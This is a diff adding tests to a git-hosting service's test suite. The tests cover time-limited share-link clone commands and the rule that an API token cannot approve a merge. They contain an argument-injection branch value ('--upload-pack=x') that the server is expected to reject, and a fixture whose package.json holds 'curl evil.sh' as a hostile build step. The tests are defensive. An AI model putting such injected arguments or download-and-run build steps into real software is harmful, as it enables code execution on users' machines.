@@ -414,6 +414,21 @@ describe("artifacts", () => {
     expect(await Bun.file(`${dir}/dig/README`).text()).toBe("found it\n");
     (await import("node:fs")).rmSync(dir, { recursive: true, force: true });
   });
+
+  test("a share link is a clone command with a read token that lasts as long as asked, a week at most", async () => {
+    const call = await local();
+    await post(call, "ana", "/api/login", { name: "ana" });
+    await post(call, "ana", "/api/repos", { name: "dig" });
+    await post(call, "ana", "/api/repos/ana/dig/files", { path: "README", content: "found it" });
+    await post(call, "ana", "/api/repos/ana/dig/do/commit?path=README", { message: "first" });
+    const day = await (await call(null, "/api/repos/ana/dig/share")).json() as any;
+    expect(day.ttl).toBe(86400);
+    expect(day.command).toMatch(/^git clone http\S+ dig$/);
+    const week = await (await call(null, "/api/repos/ana/dig/share?ttl=99999999&branch=main")).json() as any;
+    expect(week.ttl).toBe(7 * 86400);
+    expect(week.command).toMatch(/^git clone -b main /);
+    expect((await call(null, "/api/repos/ana/dig/share?branch=--upload-pack=x")).status).toBe(400);
+  });
 });
 
 describe("levels", () => {
@@ -1670,6 +1685,10 @@ describe("shares", () => {
     // The author's own build_ok is no read: only the owner's, or another member's, counts.
     expect((await post(call, "agent-a", "/api/repos/ana/r/branches/sneaky/merge", { build_ok: true })).status).toBe(409);
     expect(text(await (await call("ana", "/api/repos/ana/r/do/file?path=package.json")).json() as Doc)).toContain("vite build");
+    // build_ok is a person reading the files: the owner's own API token can't say it.
+    const tok = await (await post(call, "ana", "/api/tokens", { label: "agent", scope: "admin" })).json() as { token: string };
+    const viaToken = await call(null, "/api/repos/ana/r/branches/sneaky/merge", { method: "POST", headers: { authorization: `Bearer ${tok.token}` }, body: JSON.stringify({ build_ok: true }) });
+    expect(viaToken.status).toBe(403);
     expect((await post(call, "ana", "/api/repos/ana/r/branches/sneaky/merge", { build_ok: true })).status).toBe(200);
     expect(text(await (await call("ana", "/api/repos/ana/r/do/file?path=package.json")).json() as Doc)).toContain("curl evil.sh");
   });
